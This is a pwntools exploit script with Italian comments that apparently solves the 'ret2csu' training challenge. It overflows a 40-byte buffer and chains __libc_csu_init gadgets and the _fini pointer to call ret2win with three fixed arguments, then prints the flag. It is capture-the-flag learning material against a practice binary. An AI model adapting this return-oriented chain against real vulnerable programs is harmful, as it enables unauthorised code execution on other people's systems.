from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 40
pop_allreg_gadget = int(hex(0x0040069a),0) # pop rbx; pop rbp, pop r12; pop r13; pop r14; pop r15; ret;   gadget trovati nella sezione sym.__libc_csu_init
mov_rdxrsiedi_call_gadget = int(hex(0x00400680),0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8];
pop_rdi_gadget  = int(hex(0x004006a3),0) # pop rdi; ret;
_fini_pointer = int(hex(0x00600e48),0) # 0x600e48  ->  0x4008b4  _fini  trovato cercando nella sezione sym..dynamic con r2
deadbeef = int(hex(0xdeadbeefdeadbeef),0) # 1° ret2win parameter
cafebabe = int(hex(0xcafebabecafebabe),0) # 2° ret2win parameter
d00df00d = int(hex(0xd00df00dd00df00d),0) # 3° ret2win parameter

# context.log_level = 'debug'

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(w_off) :  # se w_off è true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    if w_off : 
        payload = [ 
            b"A" * offset,
            rop.chain()
        ]   
    else : 
        payload = [ 
            rop.chain()
        ]   
    payload = b"".join(payload)
    p.send(payload)

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./ret2csu', "./libret2csu.so") # setting del sistema

# *---------------------  START  ---------------------*

# debug
# gdbscript = "b* main"
# pid = gdb.attach(p, gdbscript=gdbscript)

# pprint(elf.symbols)
# pprint(libc.symbols)

rop = ROP(elf)
rop.raw(pop_allreg_gadget)                 # pop rbx; pop rbp, pop r12; pop r13; pop r14; pop r15; ret;
rop.raw(0)                                 # 0x00   ->   rbx
rop.raw(1)                                 # 0x01   ->   rbp   settato a 1 per bypassare il jne (jump not equal) del test rbp, rbx, visto che prima abbiamo un add rbx, 1
rop.raw(int(hex(0x00600e48),0))            # r12        _fini  ->  0x4008b4
rop.raw(deadbeef)                          # r13d  ->   edi  
rop.raw(cafebabe)                          # r14   ->   rsi     
rop.raw(d00df00d)                          # r15   ->   rdx
rop.raw(mov_rdxrsiedi_call_gadget)         # gadget mov
rop.raw(p64(0)*7)                          # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15;
rop.raw(pop_rdi_gadget)                    # pop rdi; ret;
rop.raw(deadbeef)                          # 0xdeadbeefdeadbeef   ->   rdi
rop.raw(elf.symbols["ret2win"])            

send_payload(True)

p.recvuntil(">")

p.recvline()

flag = p.recvline()
log.critical(f"Questa è la flag : {flag.decode('utf-8')}")

# *------------------      END      ------------------*